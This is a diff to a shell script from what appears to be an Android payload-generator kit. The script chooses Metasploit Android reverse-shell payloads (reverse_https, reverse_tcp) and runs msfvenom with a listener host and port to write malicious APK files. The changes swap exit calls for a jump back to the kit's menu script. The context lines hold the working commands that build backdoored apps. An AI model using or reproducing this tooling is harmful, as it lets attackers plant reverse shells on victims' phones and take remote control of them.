@@ -63,7 +63,11 @@ apv='android/shell/reverse_https'
 apv='android/shell/reverse_tcp'
 ;;
 00) clear
-exit
+cd
+cd h-sploit-paylod
+cd kit
+cd ncp
+bash opti.sh
 ;;
 *) clear
 echo ""
@@ -144,9 +148,7 @@ echo -e " $cyan Please wait a$red few minutes$grn "
 echo ""
 echo "./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
 ./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk
-fi
-cd
-exit 
+fi 
 ;;
 2) clear
 save='/home/kali/Desktop/'
@@ -186,8 +188,6 @@ echo ""
 echo "msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
 msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk
 fi
-cd
-exit 
 ;;
 *) clear
 echo ""
@@ -195,4 +195,9 @@ echo ""
 echo -e "$grn sorry, the  option you looking is not found"
 sleep 2.0
 esac;
-exit
+sleep 3.0
+cd
+cd h-sploit-paylod
+cd kit
+cd ncp
+bash opti.sh
